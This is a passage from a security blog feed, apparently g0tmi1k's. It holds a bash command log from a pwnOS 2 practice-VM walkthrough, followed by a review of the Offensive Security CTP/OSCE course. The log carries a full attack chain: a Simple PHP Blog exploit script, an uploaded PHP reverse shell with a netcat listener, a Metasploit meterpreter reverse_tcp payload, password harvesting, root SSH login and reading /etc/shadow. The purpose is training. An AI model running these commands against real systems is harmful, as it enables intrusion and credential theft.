&lt;span class="line-number"&gt;77&lt;/span&gt;
&lt;span class="line-number"&gt;78&lt;/span&gt;
&lt;span class="line-number"&gt;79&lt;/span&gt;
&lt;span class="line-number"&gt;80&lt;/span&gt;
&lt;span class="line-number"&gt;81&lt;/span&gt;
&lt;span class="line-number"&gt;82&lt;/span&gt;
&lt;span class="line-number"&gt;83&lt;/span&gt;
&lt;span class="line-number"&gt;84&lt;/span&gt;
&lt;span class="line-number"&gt;85&lt;/span&gt;
&lt;span class="line-number"&gt;86&lt;/span&gt;
&lt;span class="line-number"&gt;87&lt;/span&gt;
&lt;span class="line-number"&gt;88&lt;/span&gt;
&lt;span class="line-number"&gt;89&lt;/span&gt;
&lt;span class="line-number"&gt;90&lt;/span&gt;
&lt;span class="line-number"&gt;91&lt;/span&gt;
&lt;span class="line-number"&gt;92&lt;/span&gt;
&lt;span class="line-number"&gt;93&lt;/span&gt;
&lt;span class="line-number"&gt;94&lt;/span&gt;
&lt;span class="line-number"&gt;95&lt;/span&gt;
&lt;span class="line-number"&gt;96&lt;/span&gt;
&lt;span class="line-number"&gt;97&lt;/span&gt;
&lt;span class="line-number"&gt;98&lt;/span&gt;
&lt;span class="line-number"&gt;99&lt;/span&gt;
&lt;span class="line-number"&gt;100&lt;/span&gt;
&lt;span class="line-number"&gt;101&lt;/span&gt;
&lt;span class="line-number"&gt;102&lt;/span&gt;
&lt;span class="line-number"&gt;103&lt;/span&gt;
&lt;span class="line-number"&gt;104&lt;/span&gt;
&lt;span class="line-number"&gt;105&lt;/span&gt;
&lt;span class="line-number"&gt;106&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;netdiscover -r 10.10.10.0/24
&lt;/span&gt;&lt;span class="line"&gt;ifconfig eth0
&lt;/span&gt;&lt;span class="line"&gt;!! 10.10.10.43/24
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;10.10.10.100 &lt;span class="c"&gt;# target's IP&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;us -mT -Iv &lt;span class="nv"&gt;$ip&lt;/span&gt;:a -r &lt;span class="m"&gt;3000&lt;/span&gt; -R &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; us -mU -Iv &lt;span class="nv"&gt;$ip&lt;/span&gt;:a -r &lt;span class="m"&gt;3000&lt;/span&gt; -R 3
&lt;/span&gt;&lt;span class="line"&gt;nmap -p 1-65535 -T4 -A -v &lt;span class="nv"&gt;$ip&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;firefox &lt;span class="nv"&gt;$ip&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /pentest/web/dirb/
&lt;/span&gt;&lt;span class="line"&gt;./dirb http://&lt;span class="nv"&gt;$ip&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# /blog # Hidden!&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# /includes # PHP tags&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# /info # phpinfo()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# admin@isints.com # username? Domain?&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;firefox &lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/
&lt;/span&gt;&lt;span class="line"&gt;./dirb &lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/
&lt;/span&gt;&lt;span class="line"&gt;firefox &lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/config &lt;span class="c"&gt;#lynx10.10.10.100/blog/config/   #curl --silent $ip/blog/config/ | grep td | awk -F &amp;quot;href&amp;quot; '{print $2}'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~
&lt;/span&gt;&lt;span class="line"&gt;wget &lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/config/&lt;span class="o"&gt;{&lt;/span&gt;config,password&lt;span class="o"&gt;}&lt;/span&gt;.txt
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /pentest/exploits/exploitdb
&lt;/span&gt;&lt;span class="line"&gt;curl --silent &lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/ &lt;span class="p"&gt;|&lt;/span&gt; grep -i &lt;span class="s2"&gt;&amp;quot;simple php blog&amp;quot;&lt;/span&gt; &lt;span class="c"&gt;#| head -n 1 #| grep -i &amp;quot;powered by&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;grep -i &lt;span class="s2"&gt;&amp;quot;simple php blog&amp;quot;&lt;/span&gt; files.csv &lt;span class="c"&gt;#| uniq&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#head platforms/php/webapps/1191.pl&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;perl platforms/php/webapps/1191.pl
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#perl platforms/php/webapps/1191.pl -h http://$ip/blog/ -e 4 -F ./index.php&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#firefox http://10.10.10.100/blog/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;perl platforms/php/webapps/1191.pl -h http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/ -e 2
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd /pentest/passwords/john/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;perl platforms/php/webapps/1191.pl -h http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/ -e &lt;span class="m"&gt;3&lt;/span&gt; -U admin -P password
&lt;/span&gt;&lt;span class="line"&gt;firefox http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/login.php &lt;span class="c"&gt;# admin:password&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /pentest/backdoors/web/webshells/php/
&lt;/span&gt;&lt;span class="line"&gt;ll
&lt;/span&gt;&lt;span class="line"&gt;cp php-reverse-shell.php /tmp/evil.php
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp/
&lt;/span&gt;&lt;span class="line"&gt;vi evil.php &lt;span class="c"&gt;# ip address to 10.10.10.43&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;nc -lvvp 1234
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# firefox -&amp;gt; Upload Image -&amp;gt; File: /tmp/evil.php&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/images/evil.php
&lt;/span&gt;&lt;span class="line"&gt;perl platforms/php/webapps/1191.pl -h http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/ -e 1
&lt;/span&gt;&lt;span class="line"&gt;curl http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/images/
&lt;/span&gt;&lt;span class="line"&gt;curl http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/images/cmd.php
&lt;/span&gt;&lt;span class="line"&gt;curl http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/images/cmd.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;id
&lt;/span&gt;&lt;span class="line"&gt;curl http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/images/cmd.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;whereis%20nc   &lt;span class="c"&gt;# Both are OpenBSD, no -e support&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/images/cmd.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;file%20nc
&lt;/span&gt;&lt;span class="line"&gt;curl http://&lt;span class="nv"&gt;$ip&lt;/span&gt;/blog/images/cmd.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;file%20/etc/alternatives/nc
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;msfcsonole
&lt;/span&gt;&lt;span class="line"&gt;search Simple PHP Blog
&lt;/span&gt;&lt;span class="line"&gt;info exploit/unix/webapp/sphpblog_file_upload
&lt;/span&gt;&lt;span class="line"&gt;use exploit/unix/webapp/sphpblog_file_upload
&lt;/span&gt;&lt;span class="line"&gt;show options
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;set &lt;/span&gt;RHOST 10.10.10.100
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;set &lt;/span&gt;URI /blog/
&lt;/span&gt;&lt;span class="line"&gt;show payloads
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;set &lt;/span&gt;PAYLOAD php/meterpreter_reverse_tcp
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;set&lt;/span&gt; -g LHOST 10.10.10.43
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;set &lt;/span&gt;LPORT 4321
&lt;/span&gt;&lt;span class="line"&gt;show options
&lt;/span&gt;&lt;span class="line"&gt;exploit &lt;span class="c"&gt;# Takes a while for shell to show&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;sysinfo
&lt;/span&gt;&lt;span class="line"&gt;getuid
&lt;/span&gt;&lt;span class="line"&gt;ps
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#getpid&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;shell
&lt;/span&gt;&lt;span class="line"&gt;/bin/sh -i
&lt;/span&gt;&lt;span class="line"&gt;whoami
&lt;/span&gt;&lt;span class="line"&gt;background
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;set&lt;/span&gt; -g session 1
&lt;/span&gt;&lt;span class="line"&gt;search exploit/linux/local/
&lt;/span&gt;&lt;span class="line"&gt;serach post/linux
&lt;/span&gt;&lt;span class="line"&gt;serach post/multi
&lt;/span&gt;&lt;span class="line"&gt;info post/multi/manage/system_session
&lt;/span&gt;&lt;span class="line"&gt;use post/multi/manage/system_session
&lt;/span&gt;&lt;span class="line"&gt;show options
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;nc -lvp 4433
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd /pentest/backdoors/web/webhandler&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#./webhandler.py --listen 4433&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;exploit
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;id
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;sessions -l
&lt;/span&gt;&lt;span class="line"&gt;sessions -i 1
&lt;/span&gt;&lt;span class="line"&gt;channel -l
&lt;/span&gt;&lt;span class="line"&gt;channel -i 0
&lt;/span&gt;&lt;span class="line"&gt;id
&lt;/span&gt;&lt;span class="line"&gt;uname -a
&lt;/span&gt;&lt;span class="line"&gt;hostname
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/hosts
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/*-release
&lt;/span&gt;&lt;span class="line"&gt;ps aux
&lt;/span&gt;&lt;span class="line"&gt;netstat -antupx
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/passwd
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /var/
&lt;/span&gt;&lt;span class="line"&gt;ls -lah
&lt;/span&gt;&lt;span class="line"&gt;ls -lah www/
&lt;/span&gt;&lt;span class="line"&gt;grep -inr password ./ &lt;span class="c"&gt;# find ./ -name mysqli_connect.php -exec cat {} ;/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;cat /var/www/mysqli_connect.php
&lt;/span&gt;&lt;span class="line"&gt;cat /var/mysqli_connect.php
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/ssh/sshd_config
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;ssh root@10.10.10.100 &lt;span class="c"&gt;#root@ISIntS&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;id&lt;span class="p"&gt;;&lt;/span&gt; uname -a&lt;span class="p"&gt;;&lt;/span&gt; ifconfig -a&lt;span class="p"&gt;;&lt;/span&gt; cat /etc/shadow&lt;span class="p"&gt;;&lt;/span&gt; ls -lahR ~/
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;a name="Notes"&gt;&lt;/a&gt;
&lt;h2&gt;Notes&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Camtasia Studio has few issues, for example; when rendering highlight boxes, they are produced unevenly as well as inserting a few black frames in random places. There is nothing I can do about this for the moment and I will re-render it at a later date when there has been an update.&lt;/li&gt;
&lt;li&gt;The readme file, says this is a "pre-release" (which came out in 2011-07-04).&lt;/li&gt;
&lt;li&gt;The log files (&lt;em&gt;_history, /var/log/apache2/&lt;/em&gt;, etc) haven't been wiped from the VM before releasing.&lt;/li&gt;
&lt;li&gt;"Interesting" value in the VM's CD path.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Songs: &lt;a href="http://www.beatport.com/en-US/html/content/release/detail/339537/Punk%20Remixed"&gt;Ferry Corsten - Punk (Arty Rock-n-Rolla Mix)&lt;/a&gt; &amp;amp; &lt;a href="http://www.beatport.com/track/brute-feat-armin-van-buuren-original-extended-mix/2707188"&gt;Ferry Corsten vs Armin van Buuren - Brute (Original Extended Mix)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Video length: 11:43&lt;/p&gt;

&lt;p&gt;Capture length: 48:57&lt;/p&gt;

&lt;p&gt;Blog Post: &lt;a href="https://blog.g0tmi1k.com/2012/09/pwnos-2-php-web-application/"&gt;https://blog.g0tmi1k.com/2012/09/pwnos-2-php-web-application/&lt;/a&gt;&lt;/p&gt;</description><pubDate>Wed, 19 Sep 2012 00:50:00 +0000</pubDate></item><item><title>Cracking the Perimeter (CTP) + Offensive Security Certified Expert (OSCE)</title><link>https://blog.g0tmi1k.com/2013/08/cracking-perimeter-ctp-offensive/</link><description>&lt;p&gt;&lt;em&gt;The views and opinions expressed on this site are those of the author. Any claim, statistic, quote or other representation about a product or service should be verified with the seller, manufacturer or provider.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It's been a while &lt;em&gt;(just shy of two years)&lt;/em&gt; since I did "&lt;a href="https://blog.g0tmi1k.com/2011/07/pentesting-with-backtrack-pwb/"&gt;Penetration Testing with BackTrack (PWB) &amp;amp; Offensive Security Certified Professional (OSCP)&lt;/a&gt;". Over the last couple of weeks I've taken the next step with Offensive Security's training course – "&lt;a href="http://www.offensive-security.com/information-security-training/cracking-the-perimeter/"&gt;Cracking the Perimeter (CTP)&lt;/a&gt;", which, when successfully passed, gives you "&lt;a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/"&gt;Offensive Security Certified Expert (OSCE)&lt;/a&gt;" certificate. Below are my thoughts &amp;amp; feelings regarding my overall experience of the course.&lt;/p&gt;

&lt;p&gt;&lt;img alt="Offsec CTP box" class="center" height="304" src="https://blog.g0tmi1k.com/images/offsec-ctp-boxes-medium.png" title="Offec CTP" width="235" /&gt;&lt;/p&gt;

&lt;!--more--&gt;




&lt;div id="tocBlock"&gt;
&lt;span class="tocHeading"&gt;Table of Contents&lt;/span&gt;
&lt;ul&gt;
 &lt;li&gt;
 &lt;ul&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Myths"&gt;Myths&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Only.covers.exploit.development"&gt;Only covers exploit development&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#It.s.old.and..dated."&gt;It's old and "dated"&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#The.course.itself.is..super..hard"&gt;The course itself is (super) hard&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Review"&gt;Review&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Before.signing.up.to.the.course"&gt;Before signing up to the course&lt;/a&gt;
   &lt;ul&gt;
    &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Pre-course"&gt;Pre-course&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Course"&gt;Course&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Exam"&gt;Exam&lt;/a&gt;
&lt;/li&gt;
   &lt;/ul&gt;
   &lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Summary"&gt;Summary&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Advice"&gt;Advice&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#To.anyone.thinking.about.doing.the.course"&gt;To anyone thinking about doing the course&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#To.students.currently.doing.the.course"&gt;To students currently doing the course&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#To.students.about.to.do.the.exam..or.currently.doing.it.."&gt;To students about to do the exam (or currently doing it!)&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Resources"&gt;Resources&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;


&lt;a name="Myths"&gt;&lt;/a&gt;
&lt;h2&gt;Myths&lt;/h2&gt;

&lt;p&gt;However, before going any further, I would like to dispel up a few "myths", that I've heard, over the years. These "issues" are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Only covers exploit development&lt;/li&gt;
&lt;li&gt;It's old and "dated"&lt;/li&gt;
&lt;li&gt;The course itself is &lt;em&gt;(super)&lt;/em&gt; hard&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="Only.covers.exploit.development"&gt;&lt;/a&gt;
&lt;h3&gt;Only covers exploit development&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Wrong&lt;/strong&gt;. There are nine modules in the course (&lt;a href="http://www.offensive-security.com/documentation/cracking-the-perimiter-syllabus.pdf"&gt;syllabus&lt;/a&gt;). These can be put into the following four sections:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Bypassing Anti-Virus (AV)&lt;/li&gt;
&lt;li&gt;Exploit Development

&lt;ul&gt;
&lt;li&gt;"Advance" techniques&lt;/li&gt;
&lt;li&gt;0Day angle&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;WAN Attacks&lt;/li&gt;
&lt;li&gt;Web Attacks&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Above shows there is more to the course than just exploit development. However, there is more focus on that section than anything else. It's more accurate to say "the main element of the course is exploit development".&lt;/p&gt;

&lt;p&gt;People also easily confuse "Bypassing AV" with exploit development as you are using the same set of tools to manually do the encoding - same tools, different purpose.&lt;/p&gt;

&lt;a name="It.s.old.and..dated."&gt;&lt;/a&gt;
&lt;h3&gt;It's old and "dated"&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;So what?&lt;/strong&gt; I don't see an issue with this myself.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The methods and techniques that are covered in the course can still be applied today. Since the release of the course, there has been additional research into each section. As a result, there are different &lt;em&gt;(some people could argue "better")&lt;/em&gt; ways to achieve the same outcome. However, being able to understand how these developments came about from the original methods, and give you an alternative technique to use, will give you a broader and deeper understanding.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Some of the standard tools that "everyone" uses are now different. This doesn't mean the techniques are any different. The techniques you need to learn will always be the same. This is especially true as Offensive Security (offsec) likes to show you the manual way of doing things, rather than solely relying on tools to-do the work for you. So even if the course was updated, I believe that the methods would still be the same, it would just be that the interface had changed.&lt;/p&gt;

&lt;a name="The.course.itself.is..super..hard"&gt;&lt;/a&gt;
&lt;h3&gt;The course itself is (super) hard&lt;/h3&gt;

&lt;p&gt;PWB is a entry level course, CTP is a &lt;strong&gt;intermitted course&lt;/strong&gt;. There are harder ones to.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The exploit development in PWB is a "taster" with the course material walking you through basic buffer overflows and web attacks. Offsec also have courses called "ADVANCED Windows Exploitation (AWE)" and "ADVANCED Web Attacks and Exploitation (AWAE)"; both of these other courses are even more specialized that CTP.&lt;/p&gt;

&lt;p&gt;With that in mind, CTP is somewhere in-between with difficultly. The course starts from the basic in PWB, and stops where AWE &amp;amp; AWAE would take over. For example it's expected that the student knows what EIP is, but they don't need to understand any HEAP exploit techniques.&lt;/p&gt;

&lt;p&gt;In the same respect, you'll not be doing any basic "Remote File Inclusion (RFI)", but you are not required to-do a blind "SQL Injection (SQLi)" attacks.&lt;/p&gt;

&lt;a name="Review"&gt;&lt;/a&gt;
&lt;h2&gt;Review&lt;/h2&gt;

&lt;p&gt;Now, with all that cleared up. Here is my personal experience of going through the course from start to finish. Where possible, I'll try and relate to the PWB course.&lt;/p&gt;

&lt;a name="Before.signing.up.to.the.course"&gt;&lt;/a&gt;
&lt;h3&gt;Before signing up to the course&lt;/h3&gt;

&lt;p&gt;I followed along the tutorials from Corelan and &lt;a href="http://fuzzysecurity.com/tutorials.html"&gt;FuzzySecurity&lt;/a&gt; to improve my exploit development skills &lt;em&gt;(found them both excellent resources for this)&lt;/em&gt;. I stopped reading them when I got to the HEAP exploitation sections, as this isn't required for CTP. However, this doesn't mean:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;You shouldn't know it – it's still good to learn.&lt;/li&gt;
&lt;li&gt;If you want to use other methods that are not covered in the course, you are able to, there isn't anything stopping you.&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;I then moved onto the first few levels of Exploit-exercises's Fusion &amp;amp; Protostar. I didn't feel this was needed, but I felt it was beneficial for me as I wanted something to try out for myself without following a guide &lt;em&gt;(and it's designed to have vulnerabilities to find)&lt;/em&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I had already done various web application attacks in designed vulnerable code, so I felt confident in this area and as a result I didn't feel that I needed to-do any extra work in this field. If you want to try some yourself, I would recommend: &lt;a href="http://www.dvwa.co.uk/"&gt;DVWA&lt;/a&gt;, &lt;a href="http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10"&gt;Mutillidae&lt;/a&gt; and &lt;a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project"&gt;WebGoat&lt;/a&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Looking into the WAN attacks section; it's done using Cisco routers. When I was doing my CCNA certification, I spent a good amount of time doing extra things that were not technically in the course curriculum. It was a good chance for me to do things like this, that I wouldn't of had access to in my lab, plus my instructor didn't mind. For these reasons, I also didn't worry too much about the WAN attack.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Reading books isn't my thing, but a couple of students have recommended some and they can be found in the list of resources at the end of the page.&lt;/p&gt;

&lt;a name="Pre-course"&gt;&lt;/a&gt;
&lt;h4&gt;Pre-course&lt;/h4&gt;

&lt;p&gt;Before you're able to sign up for the course, there is a "filter" (&lt;a href="http://fc4.me/"&gt;fc4.me&lt;/a&gt;). This is put in place to make sure that the student who is about to take the course is &lt;em&gt;(hopefully)&lt;/em&gt; potentially capable of doing so. This barrier relates to what's required of you from the course.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;There isn't any shame in not being able to complete this. It simply means you're not ready... yet!&lt;/p&gt;

&lt;p&gt;If you look up the solution online, you're just cheating yourself and wasting both time and money. It's been put there for a reason. Offsec is trying to protect you from yourself &lt;em&gt;(in their own frustrating but necessary way!).&lt;/em&gt;&lt;/p&gt;

&lt;a name="Course"&gt;&lt;/a&gt;
&lt;h4&gt;Course&lt;/h4&gt;

&lt;p&gt;You are provided with the same format for your course material as with PWB, a PDF (~150 pages) and a series of videos (a little bit over 4 and a half hours).&lt;/p&gt;

&lt;p&gt;You're also assigned your own machine. However, unlike PWB, you're assigned multiple devices (two machines and a router).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The course material didn't seem to match up as well as PWB (before, it felt like a transcript), for example there were certain sections which were only covered in either the PDF or the video - so be sure to look at both of them.&lt;/p&gt;

&lt;p&gt;I would have liked to have seen some more "taxing" extra miles exercises &lt;em&gt;(which I thought was the case in PWB)&lt;/em&gt;. These extra exercises are optional tasks in the course material to "extend" your knowledge.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Certain things have purposely been "snipped" out of view in the course material. The intention is to make the student think for themselves, instead of just blindly copying the examples. This is another reason why the course is a step up in difficulty.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;For me to process all the course material which was provided, took me about 7-10 days. I started off completing two modules a day&lt;em&gt; (sailing through it all)&lt;/em&gt; - but this pace didn't last. However, the longest I spend on a single module was a couple of days.&lt;/p&gt;

&lt;p&gt;With PWB, I felt the course was building up in difficulty until module 6 (about half way through the course), and then the rest was all down hill - so to speak. However, with CTP, it was all up hill until the second to last module (8 – the HP exploit).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The course begins with web attacks: Cross Site Scripting (XSS) and Local File Inclusion (LFI).&lt;/p&gt;

&lt;p&gt;I felt the XSS was only a fraction of a step up in difficultly from PWB and I would have appreciated an automated client (from PWB) to have tested it out on, rather than myself. Additionally the vulnerability could have been more challenging, such as requiring some form of filtering (however this is covered in AWAE).&lt;/p&gt;

&lt;p&gt;The directory traversal/LFI was somewhat interesting. It's a publicly known method; however it's not done via the most common way typically shown in examples.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;From this point onwards, the rest of the course material was NOT remotely in the PWB course. Bypassing AV was the next category. This consisted of encoding detected files &amp;amp; backdooring existing programs.&lt;/p&gt;

&lt;p&gt;Everything is done manually (without relying on other people's encoders/packers). The &lt;strong&gt;exact&lt;/strong&gt; techniques covered have been detected by anti-virus companies as it has been abused for a few years – so don't expect these to work with today's modern AV &lt;em&gt;(or any that's worth their own salt!)&lt;/em&gt;. However, using the above technique, it only takes a few extra hours to play around and to develop personalized modifications, which, gradually will be detected less and less (the fewer people that know what you did – the longer the chance it will go undetected)...&lt;/p&gt;

&lt;p&gt;You can also see this as an introduction into the tools that you'll be using later to do the next section.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The next section is exploit development, which makes up the main "chunk" of the course. To me, all of these modules but the last one &lt;em&gt;(I'll get to that)&lt;/em&gt;, merged into each other. You begin with a base of an exploit, a "Proof of Concept (PoC)" code and end up creating a "weaponized" exploit resulting in a shell.&lt;/p&gt;

&lt;p&gt;After learning a couple of tricks, such as bypassing "Structured Exception Handler (SEH)" and "egg hunters", you re-use them, this time, Offsec guides you through the complete process of discovering the vulnerability to gaining a shell. This can be broken down into; causing a crash by fuzzing, understanding the crash so you can build a PoC, which leads to controlling the registers, from there you look for the user controlled buffer that is in memory, lastly its just a question of squeezing in the shellcode. Once everything is in place, you test the exploit. Trust me; it's not as bad as it sounds!&lt;/p&gt;

&lt;p&gt;There are various "commands" missing or incomplete (you just see the output, rather than how it was made). Again, this is done on purpose. For example, when generating shellcode with Metasploit, I had to figure out the bad characters myself. I also found the size of the shellcode was different from the examples, so I needed to-do a little bit of maths and update the values. What the PWB course had over CTP is, it also touches on Linux exploit development, CTP didn't.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Module 8 (the HP exploit), as I hinted at before - I'm not going to forget this exercise! There are various machines that left a scar on me when doing PWB &lt;em&gt;(gh0st, pain &amp;amp; sufferance)&lt;/em&gt;, but they didn't make an impact as much as this one. This module was hell from start to finish. All the other modules, I was able to-do between half a day to a day. This one took a "while" longer. At the time it was highly frustrating, as my exploit just wouldn't work. I tried redoing it a couple of times, used the examples &lt;em&gt;(I'm still not sure why they didn't work)&lt;/em&gt;, and, ones from other students (who were doing or had done the course) but none of them would work for me. I had done all the normal tricks of restarting the system, reverting the machine to a clean state, and following the guide exactly to the letter – nothing!&lt;/p&gt;

